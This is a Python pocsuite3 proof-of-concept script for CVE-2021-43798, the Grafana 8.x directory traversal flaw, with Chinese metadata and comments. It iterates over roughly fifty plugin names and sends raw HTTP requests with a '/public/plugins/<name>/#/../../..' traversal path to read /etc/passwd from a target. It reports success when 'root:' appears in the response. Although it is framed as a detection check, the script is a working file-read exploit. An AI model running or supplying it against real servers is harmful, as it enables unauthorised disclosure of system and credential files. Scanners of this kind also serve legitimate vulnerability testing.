from pocsuite3.api import Output, POCBase, register_poc, requests
from urllib.parse import urlparse
import socket


class GrafanaDetect(POCBase):
    vulID = 'CVE-2021-43798'  # 漏洞编号，若提交漏洞的同时提交PoC，则写成0
    version = 'v1.0'  # PoC版本，默认为1
    author = ['Yunan']  # 此PoC作者
    vulDate = '2021-12-06'  # 漏洞公开日期
    createDate = '2021-12-08'  # 编写PoC日期
    updateDate = '2021-12-08'  # 更新PoC日期，默认与createDate一样
    references = ['https://twitter.com/hacker_/status/1467880514489044993',
                  'https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw']  # 漏洞地址来源，0day不写
    name = 'Grafana未授权访问任意文件读取漏洞'  # PoC名称
    appPowerLink = 'https://grafana.com/'  # 漏洞产商主页
    appName = 'Grafana'  # 漏洞应用名称
    appVersion = 'Grafana 8.x 系列'  # 漏洞影响版本
    vulType = '未授权访问&任意文件读取'  # 漏洞类型
    desc = '''2021年12月6日，国外安全研究人员披露Grafana中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，可任意读取系统文件。'''  # 在漏洞描述填写
    samples = []  # 测试成功网址
    install_requires = []  # PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
    pocDesc = '''通过pip安装 pocsuite3 库，写入目标URL，通过该脚本检测'''  # 在PoC用法描述填写

    def _verify(self):
        result = {}
        # domain和host获取的域名会有些不一样，domain会携带域名里有端口的，此处获取两个字段是TCP建立连接和发送TCP报文要用
        domain = urlparse(self.url).netloc
        host = urlparse(self.url).hostname
        scheme = urlparse(self.url).scheme

        # grafana插件名称字典在此处加
        payload_list = [
            'alertmanager',
            'grafana',
            'loki',
            'postgres',
            'grafana-azure-monitor-datasource',
            'mixed',
            'prometheus',
            'cloudwatch',
            'graphite',
            'mssql',
            'tempo',
            'dashboard',
            'influxdb',
            'mysql',
            'testdata',
            'elasticsearch',
            'jaeger',
            'opentsdb',
            'zipkin',
            'alertGroups',
            'bargauge',
            'debug',
            'graph',
            'live',
            'piechart',
            'status-history',
            'timeseries',
            'alertlist',
            'candlestick',
            'gauge',
            'heatmap',
            'logs',
            'pluginlist',
            'table',
            'welcome',
            'annolist',
            'canvas',
            'geomap',
            'histogram',
            'news',
            'stat',
            'table-old',
            'xychart',
            'barchart',
            'dashlist',
            'gettingstarted',
            'icon',
            'nodeGraph',
            'state-timeline',
            'text'
        ]
        try:
            for payload in payload_list:
                str_payload = "GET /public/plugins/%s/#/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1\nHost: %s\n\n" % (
                    payload, domain)
                # print(str)
                socket.setdefaulttimeout(5)
                s = socket.socket()
                # 有些域名传进来后有的带端口，有的协议不同，在tcp建立连接的时候需要注意对host和port分类。
                if scheme == "http" and host == domain:
                    port = 80
                elif scheme == "https" and host == domain:
                    port = 443
                elif host != domain:
                    port = int(domain.split(':')[-1])
                    # print(port)
                s.connect((host, port))
                s.send(bytes(str_payload, encoding="utf-8"))
                # s.send(bytes(str))
                response_data = s.recv(2048)
                if response_data and b'root:' in response_data:
                    result['vulResult'] = "success"
                    result['payload'] = payload
                    break
                else:
                    pass
            return self.parse_output(result)
        except Exception as e:
            print("%s" % e)
            # 把异常抛出去，这样Agent可以扑捉到插件内部出现的异常
            raise e
        finally:
            s.close()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(GrafanaDetect)
